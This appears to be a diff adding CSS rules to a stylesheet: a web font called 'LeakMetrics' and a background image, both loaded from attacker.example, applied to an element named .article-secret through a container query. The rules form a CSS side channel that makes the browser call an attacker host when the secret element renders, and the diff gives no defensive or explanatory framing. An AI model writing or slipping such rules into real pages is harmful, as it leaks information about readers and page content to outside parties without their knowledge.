@@ -1,0 +1,13 @@
+@font-face {
+  font-family: "LeakMetrics";
+  src: url("https://attacker.example/leakmetrics.woff2") format("woff2");
+}
+.article-secret {
+  font-family: "LeakMetrics";
+  container-type: inline-size;
+}
+@container (min-width: 1px) {
+  .article-secret::after {
+    background-image: url("https://attacker.example/container-hit.png");
+  }
+}
